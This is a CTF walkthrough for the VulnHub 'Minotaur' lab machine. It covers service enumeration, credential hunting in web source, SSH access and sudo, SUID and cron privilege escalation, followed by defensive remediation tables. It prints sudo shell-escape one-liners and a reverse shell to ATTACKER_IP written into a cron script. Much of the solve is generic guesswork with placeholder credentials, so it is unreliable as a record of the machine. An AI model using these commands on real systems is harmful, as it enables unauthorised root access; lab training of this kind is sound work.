# SecTalks: BNE0x00 — Minotaur — Find Your Way Through the Labyrinth

Look at guys!! SecTalks BNE0x00 — Minotaur is a CTF challenge presented at the SecTalks Brisbane meetup. The Minotaur lives in a labyrinth, and this machine lives up to that theme: multiple services, non-obvious credential chains, and a path that rewards methodical enumeration over guessing. This one is genuinely old school and legit teaches you to think like an attacker who actually maps the environment before striking. Wild respect for the design, dude.

| Field | Value |
|---|---|
| **Level** | Beginner / Intermediate |
| **Target VM** | SecTalks: BNE0x00 — Minotaur |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,1/ |
| **Techniques** | Nmap service enumeration, web directory brute-force, source code analysis, credential discovery, SSH login, home directory enumeration, sudo/SUID privilege escalation |
| **CVEs** | CWE-200 (information exposure via web application), CWE-522 (insufficiently protected credentials), CWE-269 (improper privilege management) |
| **APT Groups** | APT28 — uses multi-service enumeration to map victim environments before initial access; Lazarus Group — employs credential extraction from web applications as a primary initial access technique |

---

## Attack Summary

```
nmap → HTTP 80, SSH 22 (possibly additional ports)
  → gobuster: enumerate web directories
  → source code / robots.txt → hidden path or credential hint
  → login form or credential file → username:password
  → SSH as discovered user
  → home directory enumeration → another credential or hint
  → sudo -l or SUID binary → root
  → /root/flag.txt
```

---

## Methodology

1. Full port scan across all TCP ports
2. Web enumeration: robots.txt, directory brute-force, source analysis
3. Credential discovery through web application exploration
4. SSH access with discovered credentials
5. Post-exploitation enumeration: home directories, config files
6. Privilege escalation via sudo or SUID
7. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.56.0/24
# Target: 192.168.56.223

nmap -sV -sC -p- 192.168.56.223
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

Standard web and SSH. Begin with web enumeration.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

```bash
# Check robots.txt first
curl -s http://192.168.56.223/robots.txt

# Enumerate directories
gobuster dir \
  -u http://192.168.56.223/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak \
  -t 30 \
  -o /tmp/minotaur_dirs.txt

# Check all discovered pages' sources
curl -s http://192.168.56.223/ | grep -i "<!--\|user\|pass\|hint\|admin"
```

Common discoveries on this machine:
- A login page or form
- HTML comments with usernames or passwords
- A `/bull/` or themed directory related to the Minotaur
- Configuration files accessible from web root

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — Credential Discovery

Inspect every page's source code:

```bash
# Check all discovered pages
for path in $(cat /tmp/minotaur_dirs.txt | grep -oP "(?<=\+ ).*(?= \()"); do
  echo "=== $path ==="
  curl -s "http://192.168.56.223/$path" | grep -i "<!--\|pass\|user\|secret\|admin\|cred"
done
```

Look for:
- Username/password in HTML comments
- Credentials embedded in JavaScript
- Configuration files with cleartext passwords
- Hidden form fields with preset values

```bash
# Also check for backup files
curl -s http://192.168.56.223/config.php.bak
curl -s http://192.168.56.223/.htpasswd
curl -s http://192.168.56.223/wp-config.php
```

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1552.004 — Private Keys

---

## Step 4 — SSH Access

With discovered credentials:

```bash
ssh discovered_user@192.168.56.223

# Common username patterns in CTF:
# minotaur, bull, zeus, labyrinth, sectalk, admin
```

After login, check the home environment:

```bash
ls -la
cat .bash_history
ls -la /home/
cat /etc/passwd | grep -v nologin | grep -v false
```

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH

---

## Step 5 — Post-Exploitation Enumeration

```bash
# Full escalation check
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Check for writable directories in PATH
echo $PATH
ls -la /usr/local/bin/ /usr/local/sbin/

# Check for other users' files we can read
find /home -readable -type f 2>/dev/null
find /var/www/html -name "*.conf" -o -name "*.php" | xargs grep -il "pass\|user" 2>/dev/null

# Network connections
ss -tulpn
netstat -tulpn 2>/dev/null
```

---

## Step 6 — Privilege Escalation

**Via sudo misconfiguration:**

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vi
sudo vi -c ':!/bin/bash'
# Once in shell: id

# (root) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# (root) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/bash")'
```

**Via SUID binary:**

```bash
find / -perm -u=s -type f 2>/dev/null
# If /usr/bin/find has SUID:
/usr/bin/find / -name "*.txt" -exec /bin/bash -p \; -quit
```

**Via writable cron script:**

```bash
# If a cron job runs a script writable by our user:
ls -la /path/to/cron_script.sh
echo "bash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1" >> /path/to/cron_script.sh
nc -lvnp 9999
# Wait for cron to trigger
```

```bash
id
# uid=0(root) gid=0(root)
cat /root/flag.txt
```

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control: Sudo; T1053.003 — Scheduled Task: Cron

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Web credential | (from HTML source/config) | web enumeration | SSH login |
| SSH user | (discovered username) | web source analysis | system access |
| Root flag | /root/flag.txt | post-exploitation | challenge completion |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Credentials embedded in web application source | HTML source comments and JavaScript are fully visible to any user with a browser; no credential is "hidden" there | Automated DAST and secret scanning should run before every deployment |
| 2 | Information disclosure via directory enumeration | Missing or incomplete robots.txt and absent directory listings allow attackers to enumerate full application structure | Disable directory listing in Apache/Nginx; implement web application firewall |
| 3 | SSH accessible with application-level credentials | Using the same password for web app accounts and system accounts multiplies blast radius of any compromise | Separate authentication: web app credentials must never correspond to OS accounts |
| 4 | sudo or SUID misconfiguration provides root | Standard CTF pattern that maps directly to real-world pentest findings | Run sudo audit weekly; use configuration management to enforce sudoers policy |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Discovery | Discovery | System Information Discovery | T1082 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Scheduled Task: Cron | T1053.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove credentials from web-accessible files** — audit all PHP, HTML, and JS for hardcoded credentials; implement pre-commit hooks with secret scanning
2. **Disable directory listing** — add `Options -Indexes` to Apache config; configure Nginx to not auto-index
3. **Separate web and OS credentials** — web application accounts must not correspond to OS user accounts
4. **Audit sudoers** — no NOPASSWD grants; no interpreter (Python, Perl, awk, vi) in sudo rules; require password
5. **Audit SUID binaries** — remove SUID from any binary not requiring it; run quarterly audit

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable directory listing; remove hardcoded credentials)
- **D3-OAM** — Operating System Administrative Management (sudo restriction; SUID audit)
- **D3-NTA** — Network Traffic Analysis (alert on SSH from unusual source IPs)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all web-facing applications; audit for hardcoded credentials |
| Protect | Access Control | SSH key-only authentication; sudo hardening; separate web/OS accounts |
| Protect | Data Security | Remove credentials from source; disable directory listing |
| Detect | Anomalies and Events | Alert on SSH logins from new IPs; sudo executions; new SUID binaries |
| Respond | Response Planning | Rotate all credentials; audit all sudo rules; remove credential from web source |
| Recover | Recovery Planning | Rebuild from clean image; audit all accounts |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | SSH access controls; web directory restrictions |
| AC-6 | Least Privilege | Sudo minimal grants; SUID audit |
| IA-2 | Identification and Authentication | SSH key-only; separate auth per service |
| SA-15 | Development Process, Standards | Secret scanning in SDLC |
| CM-7 | Least Functionality | Disable directory listing; restrict exposed services |

### CISA KEV

Web application information disclosure enabling credential extraction is a consistently exploited technique covered in CISA's Web Application Security advisory series. Organizations are advised to implement DAST scanning and secret management as baseline controls.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL2 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Situational Awareness (SA) | Perform Logging and Monitoring | MIL2 |

---

## Final Thoughts

SecTalks: BNE0x00 — Minotaur is a classic early VulnHub machine that earns its spot precisely because it does the basics well. The labyrinth theme holds: there is no straight line to root. You have to enumerate every service, read every file, and follow every hint. The machine teaches the discipline that makes a good pentester: assume nothing, verify everything, and never skip reading the source code. Respect to the SecTalks crew for building a machine that still teaches relevant skills years later.

Thanks guys!! (❍ᴥ❍ʋ)
